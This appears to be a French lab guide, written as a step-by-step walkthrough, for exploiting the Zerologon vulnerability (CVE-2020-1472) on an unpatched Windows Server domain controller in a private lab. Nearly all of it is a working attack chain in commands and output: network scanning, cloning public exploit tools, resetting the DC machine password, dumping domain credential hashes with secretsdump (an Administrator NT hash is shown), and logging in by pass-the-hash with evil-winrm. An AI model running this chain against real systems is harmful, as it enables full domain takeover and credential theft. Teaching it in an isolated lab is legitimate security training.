# LAB 1 - Exploit DC Vulnerability

Prérequis:
- 1x VM Clone avec un clone lié Windows Server 2019 d'avant 18/06/2019 (2x CPU 2x Go RAM - 40Go RAM - 1x NIC sur VMBR1)
- 1x CT LXC - Debian

# Explication de la CVE
https://cyberwatch.fr/cve/vulnerabilite-cve-2020-1472/

### Chercher le serveur Windows
`nmap -Pn 192.168.X.X/24`

### Enumérer le nom de domaine NetBIOS
https://null-byte.wonderhowto.com/how-to/enumerate-netbios-shares-with-nbtscan-nmap-scripting-engine-0193957/
`nbtscan 192.168.20.188`

### Testeur d'hote exploitable
`pip install impacket`

`git clone https://github.com/SecuraBV/CVE-2020-1472.git`

`cd CVE-2020-1472`

Cibler le serveur Windows pour voir si exploitable ou non:
`python3 zerologon_tester.py <Nom de la machine cible> <ip de la machien cible>`

`python3 zerologon_tester.py DC01 192.168.20.188`

Si fail, votre Windows est patché contre cet exploit, réinstaller un autre Windows Server non patché et recréer un domaine.

**ZeroDay Exploit installation**
```
git clone https://github.com/Sq00ky/Zero-Logon-Exploit.git
cd Zero-Logon-Exploit
apt install python3-venv
python3 -m venv impacketEnv
source impacketEnv/bin/activate
```
```
git clone https://github.com/SecureAuthCorp/impacket /opt/impacket
cd /opt/impacket
pip3 install .
python3 setup.py install
```

**Run ZeroDay Exploit**
```
cd /root/Zero-Logon-Exploit

python3 zeroLogon-NullPass.py dc01 192.168.20.188
```

**Run Secretsdump**
`python3 /opt/impacket/examples/secretsdump.py -just-dc -no-pass DC01\$@192.168.20.188`

```
mpacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrateur:500:aad3b435b51404eeaad3b435b51404ee:d274dd827e15788ae75b282c20a668d8:::
```

**Run WinRM with the HASH**
`evil-winrm -u Administrateur -H d274dd827e15788ae75b282c20a668d8 -i 192.168.20.188`

`*Evil-WinRM* PS C:\`


### Sources

Check les scripts GIT

https://github.com/fortra/impacket

https://github.com/SecuraBV/CVE-2020-1472

https://github.com/Sq00ky/Zero-Logon-Exploit

https://0xss0rz.github.io/2021-05-31-ZeroLogon/